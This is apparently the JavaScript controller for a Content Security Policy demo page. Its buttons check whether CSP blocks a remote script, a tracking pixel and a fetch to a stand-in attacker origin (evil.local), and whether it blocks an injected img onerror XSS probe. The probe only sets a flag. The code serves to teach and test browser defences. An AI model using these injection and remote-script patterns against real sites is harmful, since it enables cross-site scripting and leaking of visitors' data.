(function () {
  'use strict';

  const EVIL = 'http://evil.local:8082';

  function setStatus(id, ok, text) {
    const el = document.getElementById(id);
    if (!el) return;
    el.className = 'status ' + (ok ? 'ok' : 'err');
    el.textContent = text;
  }

  function setResult(id, kind, text) {
    const el = document.getElementById(id);
    if (!el) return;
    el.className = 'result visible ' + kind;
    el.textContent = text;
  }

  function evaluateInlineStatus() {
    const inlineRan = !!window.__inlineRan;
    const nonceRan  = !!window.__nonceRan;

    setStatus(
      'inline-status', inlineRan,
      inlineRan
        ? '[ran] inline <script> without nonce executed (no CSP barrier)'
        : '[blocked] inline <script> without nonce did not execute'
    );

    setStatus(
      'nonce-status', nonceRan,
      nonceRan
        ? '[ran] inline <script nonce="..."> executed'
        : '[blocked] inline <script nonce="..."> did not execute'
    );

    setStatus(
      'controller-status', true,
      '[ran] this controller (/static/csp_demo.js) executed - buttons are live'
    );
  }

  function runExternalScript(btn) {
    btn.disabled = true;
    setResult('external-script-result', '',
      'Appending <script src="' + EVIL + '/evil.js"> to the page...');
    document.getElementById('external-script-slot').textContent = '';

    window.__evilJsRan = false;
    const s = document.createElement('script');
    s.src = EVIL + '/evil.js?t=' + Date.now();
    s.onload = function () {
      const evidence = document.getElementById('csp-external-script-result');
      const evidenceText = evidence ? (evidence.textContent || '').trim() : '';
      setResult('external-script-result', 'error',
        '[loaded & executed] ' + EVIL + '/evil.js was fetched and the script body ran.\n' +
        'Without CSP, an attacker-controlled origin now has full JS access to this page.\n' +
        (evidenceText ? '\nMarker written by evil.js: ' + evidenceText : ''));
      btn.disabled = false;
    };
    s.onerror = function () {
      setResult('external-script-result', 'success',
        '[blocked] CSP refused to load ' + EVIL + '/evil.js\n' +
        '(see DevTools Console for the policy violation message)');
      btn.disabled = false;
    };
    document.body.appendChild(s);
  }

  function runImage(btn) {
    btn.disabled = true;
    const slot = document.getElementById('image-slot');
    slot.innerHTML = '';
    setResult('image-result', '',
      'Loading <img src="' + EVIL + '/pixel.png">...');

    const img = new Image();
    img.alt = 'tracking pixel from evil.local (scaled up 20x)';
    img.onload = function () {
      setResult('image-result', 'error',
        '[loaded] tracking pixel from ' + EVIL + ' loaded - img-src is not blocking it.\n' +
        '(In a real attack the mere fact that the request was sent already leaks the visit.)');
      slot.appendChild(img);
      btn.disabled = false;
    };
    img.onerror = function () {
      setResult('image-result', 'success',
        '[blocked] CSP img-src refused to load the pixel from ' + EVIL);
      btn.disabled = false;
    };
    img.src = EVIL + '/pixel.png?t=' + Date.now();
  }

  async function runFetch(btn) {
    btn.disabled = true;
    setResult('fetch-result', '',
      'fetch("' + EVIL + '/evil.js")...');

    try {
      const r = await fetch(EVIL + '/evil.js?t=' + Date.now(), { mode: 'no-cors' });
      setResult('fetch-result', 'error',
        '[connected] request reached ' + EVIL + ' (response type: ' + r.type + ').\n' +
        'connect-src did not block it - the attacker origin received the hit.');
    } catch (e) {
      setResult('fetch-result', 'success',
        '[blocked] fetch was refused: ' + e.message + '\n' +
        '(check DevTools Console - "Refused to connect to ..." indicates CSP connect-src.)');
    } finally {
      btn.disabled = false;
    }
  }

  function runXss(btn) {
    btn.disabled = true;
    const slot = document.getElementById('xss-slot');
    window.__xssRan = false;

    slot.innerHTML = '<img src="x" alt="xss probe" ' +
                     'onerror="window.__xssRan=true">';

    setTimeout(function () {
      if (window.__xssRan) {
        setResult('xss-result', 'error',
          '[executed] the inline onerror handler ran.\n' +
          'A real payload (cookie steal, keylogger, ...) would have fired here.');
      } else {
        setResult('xss-result', 'success',
          '[blocked] CSP refused to run the inline onerror handler.\n' +
          'The XSS payload was neutralised even though it reached the DOM.');
      }
      btn.disabled = false;
    }, 250);
  }

  async function refreshReports() {
    const out = document.getElementById('report-log');
    if (!out) return;
    try {
      const r = await fetch('/csp-report/log');
      const data = await r.json();
      out.textContent = data.length === 0
        ? '(no violations reported yet - run the tests above)'
        : JSON.stringify(data, null, 2);
      const counter = document.getElementById('report-count');
      if (counter) counter.textContent = String(data.length);
    } catch (e) {
      out.textContent = '[error] could not load report log: ' + e.message;
    }
  }

  async function clearReports(btn) {
    if (btn) btn.disabled = true;
    try { await fetch('/csp-report/clear', { method: 'POST' }); }
    catch (e) {}
    await refreshReports();
    if (btn) btn.disabled = false;
  }

  document.addEventListener('DOMContentLoaded', function () {
    evaluateInlineStatus();

    const wire = (id, fn) => {
      const el = document.getElementById(id);
      if (el) el.addEventListener('click', () => fn(el));
    };
    wire('btn-external-script', runExternalScript);
    wire('btn-image',           runImage);
    wire('btn-fetch',           runFetch);
    wire('btn-xss',             runXss);
    wire('btn-refresh-reports', refreshReports);
    wire('btn-clear-reports',   clearReports);

    if (document.getElementById('report-log')) {
      refreshReports();
      setInterval(refreshReports, 3000);
    }
  });
})();
